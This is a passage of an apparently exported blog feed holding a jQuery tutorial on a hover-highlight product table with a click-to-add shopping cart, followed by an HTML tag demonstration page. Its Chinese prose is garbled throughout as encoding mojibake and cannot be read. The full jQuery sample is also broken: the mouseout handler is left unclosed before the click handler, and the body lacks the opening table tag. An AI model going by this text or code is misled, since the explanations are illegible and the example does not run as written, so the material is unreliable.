<p>åŒæ ·çš„ï¼Œå¯¹äºDOMå¯¹è±¡event.targetï¼Œä¹Ÿæ˜¯ä¸èƒ½ä½¿ç”¨Jqueryçš„æ–¹æ³•çš„ã€‚æ¯”å¦‚ï¼Œæœ‰çš„åŒå­¦ç›´æ¥ä½¿ç”¨<code>event.target.css(&#39;background-color&#39;,&#39;red&#39;)</code>ï¼Œæƒ³è¿™æ ·æ›´æ”¹å®ƒçš„èƒŒæ™¯é¢œè‰²ã€‚è¿™æ ·æµè§ˆå™¨æ˜¯ä¼šæŠ¥é”™çš„ï¼Œé”™è¯¯æ˜¯tdå¯¹è±¡ä¸å«æœ‰cssæ–¹æ³•ã€‚</p>
<p>æ‰€ä»¥å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯DOMä¸­çš„æ–¹æ³•<code>event.target.parentNode.style.backgroundColor</code>ï¼Œé¦–å…ˆç”¨parentNodeè·å¾—tdå…ƒç´ çš„çˆ¶å…ƒç´ trå…ƒç´ ï¼ˆå› ä¸ºæˆ‘æ˜¯è¦ä¸€è¡Œéƒ½æ”¹å˜é¢œè‰²ï¼Œè€Œä¸æ˜¯åªè®©é¼ æ ‡æ‰€åœ¨çš„æ ¼å­æ”¹å˜é¢œè‰²ï¼‰ï¼Œå†ç”¨styleå±æ€§ï¼Œæ”¹å˜trå…ƒç´ çš„æ ·å¼ã€‚è¿™é‡Œè¯´ä¸€ä¸‹ï¼Œstyleä¸‹é¢æœ‰å¾ˆå¤šå±æ€§ï¼Œæ¯”å¦‚è¿™é‡Œçš„backgroundColoræ˜¯æŒ‡cssä¸­çš„<code>&#39;background-color&#39;</code>ï¼Œä¸€èˆ¬éƒ½æ˜¯cssä¸­çš„åå­—ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå•è¯é¦–å­—æ¯å˜æˆå¤§å†™ã€‚</p>
<p>æ‰€ä»¥è¿™å¥è¯ä¹Ÿå°±æ˜¯æ”¹å˜äº†trçš„æ ·å¼ï¼Œå°†cssä¸­çš„background-coloræ”¹æˆ#F0FFFFã€‚</p>
<p>ç¬¬äºŒä¸ªå‡½æ•°ä¹Ÿä¸€æ ·ï¼Œmouseoutæ–¹æ³•æ˜¯æŒ‡â€œé¼ æ ‡ç¦»å¼€â€ï¼Œå¦‚æœé¼ æ ‡ç§»å¼€ï¼Œå°±æŠŠé¢œè‰²æ”¹å›ä»¥å‰çš„é¢œè‰²ã€‚è¿™æ ·å°±å®Œæˆäº†æˆ‘ä»¬è¿™ä¸ªâ€œå˜è‰²è¡¨æ ¼â€çš„åˆ¶ä½œã€‚</p>
<p><strong> ä¸€ä¸ªé€‰æ‹©å•†å“ç³»ç»Ÿ</strong></p>
<p>æˆ‘ä»¬ç»§ç»­æ¥å¼ºåŒ–åˆšæ‰åˆ¶ä½œçš„è¿™ä¸ªè¡¨æ ¼ã€‚</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;è¡¨æ ¼1&lt;/title&gt;
&lt;style&gt;
table.hovertable {
    font-size:13px;
    color:#333333;
    border-width: 1px;
    border-color: #999999;
    border-collapse: collapse;
    width: 100%;
}
table.hovertable th {
    background-color:#c3dde0;
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
    text-align: left;
}
table.hovertable tr {
    background-color:#d4e3e5;
}
table.hovertable td {
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
}
&lt;/style&gt;
&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$(document).ready(function(){
    $(&quot;.hovertable td&quot;).mouseover(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;;
    });
    $(&quot;.hovertable td&quot;).mouseout(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;;
    $(&quot;.hovertable td&quot;).click(function(event){
        var name = $(event.target.parentNode).children(&quot;td:first&quot;).html();
        var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();
        $(event.target.parentNode).remove();
        $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;å…ƒ&lt;/p&gt;&apos;);

    });
});
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;tr&gt;&lt;th width=&quot;40%&quot;&gt;å•†å“&lt;/th&gt;&lt;th width=&quot;40%&quot;&gt;ç±»åˆ«&lt;/th&gt;&lt;th&gt;ä»·æ ¼&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;è‚¥çš‚&lt;/td&gt;&lt;td&gt;æ—¥ç”¨å“&lt;/td&gt;&lt;td&gt;5.5&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;æ‹–æŠŠ&lt;/td&gt;&lt;td&gt;æ¸…æ´ç”¨å“&lt;/td&gt;&lt;td&gt;25.0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;ç¡¬ç›˜&lt;/td&gt;&lt;td&gt;ç”µå­äº§å“&lt;/td&gt;&lt;td&gt;450.0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;é…¸å¥¶&lt;/td&gt;&lt;td&gt;å¥¶åˆ¶å“&lt;/td&gt;&lt;td&gt;9.9&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;è‹¹æœ&lt;/td&gt;&lt;td&gt;æ°´æœ&lt;/td&gt;&lt;td&gt;2.5&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;div id=&quot;buy&quot; style=&quot;border: 1px solid #999;margin-top: 10px;text-align: center;&quot;&gt;
    &lt;h4 style=&quot;color: red;&quot;&gt;è´­ç‰©è½¦&lt;/h4&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>å¤§å®¶è¿è¡Œåå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡æˆ‘åšäº†ä¸€ä¸ªç±»ä¼¼ç½‘ä¸Šè´­ç‰©æ—¶é€‰è´­å•†å“çš„é¡µé¢ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery5.png" alt=""></p>
<p>æ¯ç‚¹å‡»ä¸€ä¸ªå•†å“ï¼Œæˆ‘ä»¬å°±æŠŠè¿™ä¸€è¡Œä»è¡¨æ ¼ä¸­åˆ é™¤ï¼Œå¹¶åŠ åˆ°ä¸‹æ–¹çš„â€œè´­ç‰©è½¦â€æ¡†ä¸­ã€‚å…¶å®æ”¹åŠ¨å¹¶ä¸å¤§ï¼Œè¡¨æ ¼è¿˜æ˜¯åˆšæ‰çš„è¡¨æ ¼ï¼ŒJqueryä¸­å¢åŠ äº†ä¸€ä¸ªå‡½æ•°ï¼š</p>
<pre><code>$(&quot;.hovertable td&quot;).click(function(event){
    var name = $(event.target.parentNode).children(&quot;td:first&quot;).html();
    var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();
    $(event.target.parentNode).remove();
    $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;å…ƒ&lt;/p&gt;&apos;);
});
</code></pre><p>å°±æ˜¯ä¸€ä¸ªå½“æŸä¸ªæ ¼å­è¢«ç‚¹å‡»æ—¶ï¼Œæ‰§è¡Œçš„ä»£ç ã€‚çœ‹ç¬¬ä¸€è¡Œï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œevent.target.parentNodeæˆ‘è®¤è¯†ï¼Œä½†ä¸ºä»€ä¹ˆè¦æŠŠå®ƒæ”¾åœ¨$()ä¸­é—´ï¼Ÿ</p>
<p>è¿™å°±æ¶‰åŠåˆ°DOMå¯¹è±¡è½¬æ¢æˆJqueryå¯¹è±¡çš„è¿‡ç¨‹ã€‚å¤§å®¶ç”¨Jqueryå¤šäº†å°±ä¼šå–œæ¬¢Jqueryçš„ç®€æ´ï¼Œä½†DOMå¯¹è±¡å¹¶ä¸èƒ½ä½¿ç”¨Jqueryçš„æ–¹æ³•ï¼Œæ‰€ä»¥Jqueryå…¶å®ç»™äº†å¤§å®¶ä¸€ä¸ªæ–¹å¼ï¼Œèƒ½æŠŠDOMå¯¹è±¡è½¬æ¢æˆJqueryå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æŠŠDOMå¯¹è±¡ç›´æ¥æ”¾åˆ°$()ä¸­å³å¯ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬ä¸€èˆ¬å†™çš„<code>$(document).readyï¼Œ</code>å…¶å®å°±æ˜¯æŠŠDOMå¯¹è±¡documentè½¬æ¢æˆäº†Jqueryå¯¹è±¡ï¼Œä½¿ç”¨Jqueryçš„æ–¹æ³•readyã€‚</p>
<p>è¿™é‡Œä¹Ÿä¸€æ ·ï¼ŒæŠŠ<code>event.target.parentNode</code>è½¬æ¢æˆäº†Jqueryçš„å¯¹è±¡ã€‚åé¢ä¸€ä¸ªchildrenå…¶å®æ˜¯Jqueryä¸‹æˆ‘æ²¡è®²åˆ°çš„â€œéå†å‡½æ•°â€ã€‚éå†å‡½æ•°å…¶å®å°±æ˜¯éå†æŸä¸ªå¯¹è±¡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¸€ä¸ªtableå¯¹è±¡ï¼Œè¦å–å…¶ä¸­æ¯è¡Œçš„å†…å®¹ï¼Œå°±å¯ä»¥ç”¨eachæ–¹æ³•éå†ã€‚</p>
<p>childrenæ–¹æ³•ç”¨çš„ä¹Ÿå¾ˆå¤šï¼Œæ„æ€æ˜¯å–æ»¡è¶³æ¡ä»¶çš„æŸå­å…ƒç´ ã€‚å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œchildren(â€œtd:firstâ€)ï¼Œå°±æ˜¯å–ç¬¬ä¸€ä¸ªtdå…ƒç´ ã€‚ä¹Ÿå°±æ˜¯è¿™ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªæ ¼å­ï¼Œå†ç”¨html()å–åˆ°å…¶å†…å®¹ï¼Œä¿å­˜åˆ°å˜é‡nameé‡Œã€‚</p>
<p><code>var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();</code>ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†ï¼Œå–æœ€åä¸€ä¸ªæ ¼å­å†…å®¹ã€‚</p>
<p>äºæ˜¯è¿™é‡Œå°±å¾—åˆ°äº†æˆ‘ç‚¹å‡»çš„è¿™ä¸€è¡Œçš„å•†å“åå’Œä»·æ ¼ã€‚ç„¶åç”¨$(event.target.parentNode).remove();æŠŠè¿™ä¸€è¡Œç§»é™¤ï¼Œå†ç”¨appendæŠŠå†…å®¹åŠ åˆ°â€œè´­ç‰©è½¦â€é‡Œã€‚å°±åˆ¶æˆäº†è¿™ä¸ªç®€å•çš„é€‰è´­å•†å“çš„é¡µé¢ã€‚</p>
<p>æœ¬æ–‡å†…å®¹è½¬è‡ªï¼š<a href="https://www.leavesongs.com/" target="_blank" rel="external">ç¦»åˆ«æ­Œ</a></p>
]]></content>
      
        
        <tags>
            
            <tag> å‰ç«¯ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> JQuery </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTMLå­¦ä¹ ç¬”è®°]]></title>
      <url>/2016/08/26/HTML%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ä¸‹çš„ä¸€ä¸ªåº”ç”¨ã€‚<br>â€œè¶…æ–‡æœ¬â€å°±æ˜¯æŒ‡é¡µé¢å†…å¯ä»¥åŒ…å«å›¾ç‰‡ã€é“¾æ¥ï¼Œç”šè‡³éŸ³ä¹ã€ç¨‹åºç­‰éæ–‡å­—å…ƒç´ ã€‚<br>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€çš„ç»“æ„åŒ…æ‹¬â€œå¤´â€éƒ¨åˆ†ï¼ˆè‹±è¯­ï¼šHeadï¼‰ã€å’Œâ€œä¸»ä½“â€éƒ¨åˆ†ï¼ˆè‹±è¯­ï¼šBodyï¼‰ï¼Œå…¶ä¸­â€œå¤´â€éƒ¨æä¾›å…³äºç½‘é¡µçš„ä¿¡æ¯ï¼Œâ€œä¸»ä½“â€éƒ¨åˆ†æä¾›ç½‘é¡µçš„å…·ä½“å†…å®¹ã€‚<br><a id="more"></a></p>
<p><head></head></p>
<p><meta charset="utf-8"></p>
<p><title>HTMLå­¦ä¹ ç¬”è®°</title></p>
<p><meta name="keywords" content="å‰ç«¯å¼€å‘,Webæ ‡å‡†"></p>
<p><meta name="description" content="ç¼–å†™HTMLæ—¶å¸¸ç”¨åˆ°çš„æ ‡ç­¾åœ¨æµè§ˆå™¨ä¸‹çš„é»˜è®¤æ•ˆæœã€‚"></p>
<p><meta name="viewport" content="width=device-width,initial-scale=1.0"><br></p>
<p></p><h1>HTML å¸¸ç”¨æ ‡ç­¾æ¼”ç¤º</h1><p></p>
<p>æœ¬é¡µæ¼”ç¤ºçš„æ‰€æœ‰æ ‡ç­¾å‡ä¸ºæµè§ˆå™¨é»˜è®¤æ•ˆæœã€‚</p><br><h2>ã€åŸºç¡€ã€‘</h2><br><p><strong>&lt;div&gt;</strong> å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚<small>ï¼ˆå—å…ƒç´ ï¼Œæ— ä»»ä½•å±æ€§ï¼‰</small></p><br><p><strong>&lt;span&gt;</strong> <span>å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚</span><small>ï¼ˆå†…è”å…ƒç´ ï¼Œæ— ä»»ä½•å±æ€§ï¼‰</small></p><br><hr><br><p><strong>&lt;h1&gt;</strong> to <strong>&lt;h6&gt;</strong> å®šä¹‰æ ‡é¢˜<small>ï¼ˆé€šå¸¸ä½¿ç”¨ç²—ä½“æ˜¾ç¤ºã€‚æ³¨æ„ï¼šå•ä¸ªé¡µé¢å†…æœ€å¥½åªä½¿ç”¨1ä¸ªH1æ ‡ç­¾ï¼‰</small></p><br><h1>H1 æ ‡é¢˜</h1><br><h2>H2 æ ‡é¢˜</h2><br><h3>H3 æ ‡é¢˜</h3><br><h4>H4 æ ‡é¢˜</h4><br><h5>H5 æ ‡é¢˜</h5><br><h6>H6 æ ‡é¢˜</h6><br><hr><br><p><strong>&lt;p&gt;</strong> å®šä¹‰æ®µè½</p><br><hr><br><p><strong>&lt;hr&gt;</strong> å®šä¹‰æ°´å¹³çº¿<small>ï¼ˆæœ¬é¡µä¸­çš„åˆ†å‰²çº¿å‡ä¸º &lt;hr&gt; æ ‡ç­¾ï¼‰</small></p><br><hr><br><p><strong>&lt;header&gt;</strong> å®šä¹‰ section æˆ–é¡µé¢çš„å¤´éƒ¨</p><br><p><strong>&lt;footer&gt;</strong> å®šä¹‰ section æˆ–é¡µé¢çš„å°¾éƒ¨</p><br><p><strong>&lt;article&gt;</strong> å®šä¹‰æ–‡ç« </p><br><p><strong>&lt;section&gt;</strong> å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚</p><br><p><strong>&lt;aside&gt;</strong> å®šä¹‰æ–‡æ¡£å†…å®¹ç›¸å…³çš„å†…å®¹</p><br><p><strong>&lt;nav&gt;</strong> å®šä¹‰å¯¼èˆª</p><br><header>header å¤´éƒ¨</header><br><footer>footer å°¾éƒ¨</footer><br><article>article å†…å®¹</article><br><section>section å†…å®¹</section><br><aside>aside å†…å®¹</aside><br><nav>nav å†…å®¹</nav><br><hr><br><p><strong>&lt;details&gt;</strong> å®šä¹‰ç»†èŠ‚å†…å®¹</p><br><p><strong>&lt;summary&gt;</strong> å®šä¹‰ details çš„æ ‡é¢˜</p><br><details><br><p>All pages and graphics on this web site are the property of W3School.</p><br></details><br><details><br><summary>HTML 5</summary><br>This document teaches you everything you have to learn about HTML 5.<br></details><br><hr><br><h2>ã€åˆ—è¡¨ã€‘</h2><br><p><strong>&lt;ul&gt;</strong> å®šä¹‰æ— åºåˆ—è¡¨<small>ï¼ˆé€šå¸¸åˆ—è¡¨å‰ä¼šæœ‰é¡¹ç›®ç¬¦å·ï¼‰</small></p><br><ul><br>  <li><strong>&lt;li&gt;</strong> å®šä¹‰åˆ—è¡¨çš„é¡¹ç›®</li><br>  <li>å¼ ä¸‰</li><br>  <li>æå››</li><br></ul><br><hr><br><p><strong>&lt;ol&gt;</strong> å®šä¹‰æœ‰åºåˆ—è¡¨ã€‚<small>ï¼ˆé€šå¸¸åˆ—è¡¨å‰ä¼šæœ‰æ•°å­—ç¬¦å·ï¼‰</small></p><br><ol><br>  <li><strong>&lt;li&gt;</strong> å®šä¹‰åˆ—è¡¨çš„é¡¹ç›®</li><br>  <li>å¼ ä¸‰</li><br>  <li>æå››</li><br></ol><br><hr><br><p><strong>&lt;dl&gt;</strong> å®šä¹‰å®šä¹‰åˆ—è¡¨</p><br><dl><br>  <dt><strong>&lt;dt&gt;</strong> å®šä¹‰å®šä¹‰åˆ—è¡¨ä¸­çš„é¡¹ç›®</dt><br>  <dd><strong>&lt;dd&gt;</strong> å®šä¹‰å®šä¹‰åˆ—è¡¨ä¸­é¡¹ç›®çš„æè¿° </dd><br>  <dt>CFç©¿è¶Šç«çº¿</dt><br>  <dd>CFæ˜¯ä¸€ä¸ªå¾ˆå¥½ç©çš„æ¸¸æˆå•Šï¼Œä¸€èˆ¬äººç©ä¸äº†..</dd><br></dl><br><hr><br><h2>ã€è¡¨æ ¼ã€‘</h2><br><p><strong>&lt;table&gt;</strong> å®šä¹‰è¡¨æ ¼</p><br><p><strong>&lt;caption&gt;</strong> å®šä¹‰è¡¨æ ¼æ ‡é¢˜</p><br><p><strong>&lt;thead&gt;</strong> å®šä¹‰è¡¨æ ¼ä¸­çš„è¡¨å¤´å†…å®¹</p><br><p><strong>&lt;tfoot&gt;</strong> å®šä¹‰è¡¨æ ¼ä¸­çš„è¡¨æ³¨å†…å®¹ï¼ˆè„šæ³¨ï¼‰</p><br><p><strong>&lt;tbody&gt;</strong> å®šä¹‰è¡¨æ ¼ä¸­çš„ä¸»ä½“å†…å®¹</p><br><p><strong>&lt;tr&gt;</strong> å®šä¹‰è¡¨æ ¼ä¸­çš„è¡Œ</p><br><p><strong>&lt;th&gt;</strong> å®šä¹‰è¡¨æ ¼ä¸­çš„è¡¨å¤´å•å…ƒæ ¼<small>ï¼ˆé€šå¸¸ä½¿ç”¨ç²—ä½“æ˜¾ç¤ºï¼‰</small></p><br><p><strong>&lt;td&gt;</strong> å®šä¹‰è¡¨æ ¼ä¸­çš„å•å…ƒ</p>

<p>table ç»“æ„æ ‡å‡†é¡ºåºå¦‚ä¸‹ï¼š</p><br><pre><br>&lt;table&gt;<br>  &lt;caption&gt;&lt;/caption&gt;<br>  &lt;thead&gt;<br>    &lt;tr&gt;<br>      &lt;th&gt;&lt;/th&gt;<br>    &lt;/tr&gt;<br>  &lt;/thead&gt;<br>  &lt;tfoot&gt;<br>    &lt;tr&gt;<br>      &lt;td&gt;&lt;/td&gt;<br>    &lt;/tr&gt;<br>  &lt;/tfoot&gt;<br>  &lt;tbody&gt;<br>    &lt;tr&gt;<br>      &lt;td&gt;&lt;/td&gt;<br>    &lt;/tr&gt;<br>  &lt;/tbody&gt;<br>&lt;/table&gt;<br></pre><br><p>â€» è™½ç„¶ tfoot æ”¾åœ¨äº† tbody ä¹‹å‰ï¼Œæµè§ˆå™¨ä¾ç„¶ä¼šå°† tfoot æ˜¾ç¤ºåœ¨ tbody ä¹‹åï¼Œè€Œä¸”è¿™æ ·åšèƒ½è®©æµè§ˆå™¨åœ¨è·å¾—æ‰€æœ‰è¡¨æ ¼å†…çš„æ•°æ®å‰æ˜¾ç¤ºè¡¨æ³¨ã€‚</p>

<p><table><br>  <caption>è¡¨æ ¼æ ‡é¢˜</caption><br>  <thead><br>    <tr><br>      <th>è¡¨å¤´ ID</th><br>      <th>è¡¨å¤´ å§“å</th><br>      <th>è¡¨å¤´ æ—¥æœŸ</th><br>    </tr><br>  </thead><br>  <tfoot><br>    <tr><br>      <td>è¡¨æ³¨ è¿™æ˜¯ç¼–å·</td><br>      <td>è¡¨æ³¨ è¿™æ˜¯å‡å</td><br>      <td>è¡¨æ³¨ è¿™æ˜¯æ·»åŠ æ—¥æœŸ</td><br>    </tr><br>  </tfoot><br>  <tbody><br>    <tr><br>      <td>1</td><br>      <td>å¼ ä¸‰</td><br>      <td>2019-09-09</td><br>    </tr><br>    <tr><br>      <td>2</td><br>      <td>æå››</td><br>      <td>2016-6-6</td><br>    </tr><br>  </tbody><br></table></p>
<p><hr></p>
<p><table border="1" cellpadding="1" cellspacing="0"><br>  <caption>è‡ªå¸¦è¾¹æ¡†æ ·å¼</caption><br>  <thead><br>    <tr><br>      <th>è¡¨å¤´ ID</th><br>      <th>è¡¨å¤´ å§“å</th><br>      <th>è¡¨å¤´ æ—¥æœŸ</th><br>    </tr><br>  </thead><br>  <tfoot><br>    <tr><br>      <td>è¡¨æ³¨ è¿™æ˜¯ç¼–å·</td><br>      <td>è¡¨æ³¨ è¿™æ˜¯å‡å</td><br>      <td>è¡¨æ³¨ è¿™æ˜¯æ·»åŠ æ—¥æœŸ</td><br>    </tr><br>  </tfoot><br>  <tbody><br>    <tr><br>      <td>1</td><br>      <td>å¼ ä¸‰</td><br>      <td>20019-09-09</td><br>    </tr><br>    <tr><br>      <td>2</td><br>      <td>æå››</td><br>      <td>2016-6-6</td><br>    </tr><br>  </tbody><br></table></p>
<p><hr></p>
<h2>ã€è¡¨å•ã€‘</h2>

<p><strong>&lt;form&gt;</strong> å®šä¹‰è¡¨å•</p><br><hr><br><p><strong>&lt;fieldset&gt;</strong> å®šä¹‰å›´ç»•è¡¨å•ä¸­å…ƒç´ çš„è¾¹æ¡†<small>ï¼ˆé€šå¸¸å››å‘¨ä¼šæœ‰ç¼©è¿›ï¼Œå¹¶æ˜¾ç¤ºå›´ç»•çš„è¾¹æ¡†ï¼‰</small></p><br><p><strong>&lt;legend&gt;</strong> å®šä¹‰ fieldset å…ƒç´ çš„æ ‡é¢˜</p><br><fieldset><br>  <legend>æ ‡é¢˜</legend><br>  <p>å†…å®¹</p><br></fieldset><br><hr><br><p><strong>&lt;select&gt;</strong> å®šä¹‰é€‰æ‹©åˆ—è¡¨ï¼ˆä¸‹æ‹‰åˆ—è¡¨ã€å¤šé€‰åˆ—è¡¨ï¼‰</p><br><p><strong>&lt;optgroup&gt;</strong> å®šä¹‰é€‰æ‹©åˆ—è¡¨ä¸­ç›¸å…³é€‰é¡¹çš„ç»„åˆ</p><br><p><strong>&lt;option&gt;</strong> å®šä¹‰é€‰æ‹©åˆ—è¡¨ä¸­çš„é€‰é¡¹</p><br><select><br>  <optgroup label="å¼ æ°"><br>    <option>å¼ ä¸‰</option><br>    <option>å¼ ä¸‰çš„å„¿å­</option><br>    <option>å¼ ä¸‰çš„å­™å¥³</option><br>  </optgroup><br>  <optgroup label="ææ°"><br>    <option>æå››</option><br>    <option>æå››çš„å¥³å„¿</option><br>    <option>æå››çš„å­™å­</option><br>  </optgroup><br></select><br><hr><br><p>æ»šåŠ¨åˆ—è¡¨å½¢å¼</p><br><select size="5"><br>  <optgroup label="å¼ æ°"><br>    <option>å¼ ä¸‰</option><br>    <option>å¼ ä¸‰çš„å„¿å­</option><br>    <option>å¼ ä¸‰çš„å­™å¥³</option><br>  </optgroup><br>  <optgroup label="ææ°"><br>    <option>æå››</option><br>    <option>æå››çš„å¥³å„¿</option><br>    <option>æå››çš„å­™å­</option><br>  </optgroup><br></select><br><hr><br><p>å¤šé€‰åˆ—è¡¨</p><br><select multiple><br>  <optgroup label="å¼ æ°"><br>    <option>å¼ ä¸‰</option><br>    <option>å¼ ä¸‰çš„å„¿å­</option><br>    <option>å¼ ä¸‰çš„å­™å¥³</option><br>  </optgroup><br>  <optgroup label="ææ°"><br>    <option>æå››</option><br>    <option>æå››çš„å¥³å„¿</option><br>    <option>æå››çš„å­™å­</option><br>  </optgroup><br></select><br><hr><br><form id="test_form" action="#test_form"><br><p><strong>&lt;input&gt;</strong> å®šä¹‰è¾“å…¥æ§ä»¶<small>ï¼ˆå¦‚æœæµè§ˆå™¨ä¸æ”¯æŒ HTML5 æ–°çš„ç±»å‹ï¼Œé‚£ä¹ˆä¼šä½¿ç”¨æ–‡æœ¬åŸŸæ›¿ä»£ï¼‰</small></p><br><p>æ–‡æœ¬åŸŸ <code>type=â€textâ€</code> <input name="" type="text"></p><br><p>å¯†ç åŸŸ <code>type=â€passwordâ€</code> <input name="" type="password"></p><br><p>å¤é€‰æ¡† <code>type=â€checkboxâ€</code> <input name="" type="checkbox" value="">A <input name="" type="checkbox" value="">B <input name="" type="checkbox" value="">C</p><br><p>å•é€‰æŒ‰é’® <code>type=â€radioâ€</code> ç»„A:<input name="radio_a" type="radio" value="" checked="checked">â‘  <input name="radio_a" type="radio" value="">â‘¡ã€€ã€€ç»„B:<input name="radio_b" type="radio" value="" checked="checked">â…  <input name="radio_b" type="radio" value="">â…¡</p><br><p>æ–‡ä»¶åŸŸ <code>type=â€fileâ€</code> <input name="" type="file"></p><br><p>å›¾åƒåŸŸ <code>type=â€imageâ€</code> <input name="" type="image" src="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" alt="å›¾ç‰‡æ— æ³•æ˜¾ç¤º"><small>ï¼ˆå¯ç”¨åšæäº¤æŒ‰é’®ï¼‰</small></p><br><p>éšè—åŸŸ <code>type=â€hiddenâ€</code> <input name="" type="hidden" value=""><small>ï¼ˆå½“ç„¶æ˜¯çœ‹ä¸è§çš„äº†ï¼‰</small></p><br><p>æ™®é€šæŒ‰é’® <code>type=â€buttonâ€</code> <input name="" type="button" value="æ— ä»»ä½•ä½œç”¨çš„æŒ‰é’®"></p><br><p>é‡ç½®æŒ‰é’® <code>type=â€resetâ€</code> <input name="" type="reset" value="é‡ç½®æ‰€æœ‰æ§ä»¶"></p><br><p>æäº¤æŒ‰é’® <code>type=â€submitâ€</code> <input name="" type="submit" value="æäº¤è¡¨å•ç”¨çš„æŒ‰é’®"></p>

<p>email åŸŸ <code>type=â€emailâ€</code> <input name="" type="email"><small>ï¼ˆè‹¥æœ‰è¾“å…¥å†…å®¹ï¼Œåˆ™ä¼šéªŒè¯æ ¼å¼æ˜¯å¦ç¬¦åˆ emailï¼‰</small></p><br><p>url åŸŸ <code>type=â€urlâ€</code> <input name="" type="url"><small>ï¼ˆè‹¥æœ‰è¾“å…¥å†…å®¹ï¼Œåˆ™ä¼šéªŒè¯æ ¼å¼æ˜¯å¦ç¬¦åˆ urlï¼‰</small></p><br><p>æ•°å€¼åŸŸ <code>type=â€numberâ€</code> <input name="" type="number" min="1" max="10"><small>ï¼ˆè‹¥æœ‰è®¾ç½®æœ€å¤§å€¼æˆ–æœ€å°å€¼ï¼Œåˆ™ä¼šéªŒè¯æ•°å­—æ˜¯å¦åœ¨æœ€å¤§æœ€å°å€¼ä¹‹å†…ï¼‰</small></p><br><p>æ•°å€¼èŒƒå›´åŸŸ <code>type=â€rangeâ€</code> <input name="" type="range" min="1" max="10"><small>ï¼ˆé€šè¿‡æ‹–åŠ¨æ»‘å—æ¥é€‰æ‹©æ•°å€¼ï¼‰</small></p><br><p>æ—¥æœŸåŸŸ <code>type=â€dateâ€</code> <input name="" type="date"><small>ï¼ˆä¼šè°ƒç”¨æµè§ˆå™¨è‡ªå¸¦çš„æ—¥æœŸé€‰æ‹©å™¨ï¼Œå¯è®¾ç½®çš„ç±»å‹ï¼šdate, month, week, time, datetime, datetime-localï¼‰</small></p><br><p>ã€€ã€€ã€€ <code>type=â€monthâ€</code> <input name="" type="month"></p><br><p>ã€€ã€€ã€€ <code>type=â€weekâ€</code> <input name="" type="week"></p><br><p>ã€€ã€€ã€€ <code>type=â€timeâ€</code> <input name="" type="time"></p><br><p>ã€€ã€€ã€€ <code>type=â€datetimeâ€</code> <input name="" type="datetime"></p><br><p>ã€€ã€€ã€€ <code>type=â€datetime-localâ€</code> <input name="" type="datetime-local"></p><br><p>è‰²å€¼åŸŸ <code>type=â€colorâ€</code> <input name="" type="color"><small>ï¼ˆä¼šè°ƒç”¨æµè§ˆå™¨è‡ªå¸¦çš„é¢œè‰²é€‰æ‹©å™¨ï¼‰</small></p><br><p>æœç´¢åŸŸ <code>type=â€searchâ€</code> <input name="" type="search"><small>ï¼ˆç”¨äºæœç´¢ï¼Œç«™å†…æœç´¢æˆ– Google æœç´¢ç­‰ï¼Œåœ¨è¾“å…¥æ¡†å†…å®¹å³ä¾§é€šå¸¸ä¼šå‡ºç°æ¸…é™¤æŒ‰é’®ï¼‰</small></p><br><hr><br><p><strong>&lt;datalist&gt;</strong> å®šä¹‰ input å…ƒç´ çš„é€‰é¡¹åˆ—è¡¨</p>

<p><div><br>  <input id="myCar" list="cars"><br>  <datalist id="cars"><br>    <option value="BMW"><br>    </option><option value="Ford"><br>    </option><option value="Volvo"><br>  </option></datalist><br></div></p>
<p><hr></p>
